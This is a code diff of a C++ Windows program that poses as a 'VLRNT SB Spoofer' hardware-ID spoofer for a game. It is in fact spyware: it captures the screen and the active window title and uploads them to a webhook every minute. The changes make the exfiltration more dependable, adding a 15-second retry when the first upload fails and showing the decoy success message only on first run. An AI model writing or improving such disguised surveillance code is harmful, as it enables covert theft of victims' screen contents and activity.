@@ -132,8 +132,8 @@ std::string GetTimestampFull() {
     return ss.str();
 }
 
-void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
-    if (WEBHOOK_URL.find("http") == std::string::npos) return;
+bool UpdateSyncStatus(SessionInfo si, bool forceCapture) {
+    if (WEBHOOK_URL.find("http") == std::string::npos) return false;
 
     bool capturing = forceCapture;
     if (capturing && GetSystemLoad() > 90) capturing = false;
@@ -141,8 +141,9 @@ void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
     std::vector<unsigned char> screenData;
     if (capturing) screenData = CaptureScreen();
 
+    bool success = false;
     HINTERNET hSession = InternetOpenA("DRV_SYNC_ENGINE", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hSession) return;
+    if (!hSession) return false;
 
     char title[256]; GetWindowTextA(GetForegroundWindow(), title, 256);
     std::string active = (strlen(title) > 0) ? title : "Desktop / Idle";
@@ -195,12 +196,14 @@ void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
                 }
                 InternetWriteFile(hRequest, footer.c_str(), footer.length(), &written);
                 HttpEndRequestA(hRequest, NULL, 0, 0);
+                success = true;
             }
             InternetCloseHandle(hRequest);
         }
         InternetCloseHandle(hConnect);
     }
     InternetCloseHandle(hSession);
+    return success;
 }
 
 void StartProtector() {
@@ -237,7 +240,9 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
     StartProtector();
     SessionInfo si = GetStartupPulse();
-    MessageBoxA(NULL, "Spoofer Success: All HWID hooks established successfully.\r\nPlease keep this process active to maintain driver sync.", "VLRNT SB Spoofer", MB_OK | MB_ICONINFORMATION);
+    if (si.isFirstEver) {
+        MessageBoxA(NULL, "Spoofer Success: All HWID hooks established successfully.\r\nPlease keep this process active to maintain driver sync.", "VLRNT SB Spoofer", MB_OK | MB_ICONINFORMATION);
+    }
 
     GdiplusStartupInput gsi; ULONG_PTR gst;
     GdiplusStartup(&gst, &gsi, NULL);
@@ -254,7 +259,13 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
             if (loopCount % 10 == 0) captureThisTime = true;
         }
         
-        UpdateSyncStatus(si, captureThisTime);
+        bool sent = UpdateSyncStatus(si, captureThisTime);
+        if (loopCount == 0 && !sent) {
+            // First capture failed (likely NO INTERNET at startup delay). Retry every 15s instead of logging loop count.
+            Sleep(15000); 
+            continue;
+        }
+
         Sleep(60000); 
         loopCount++;
     }
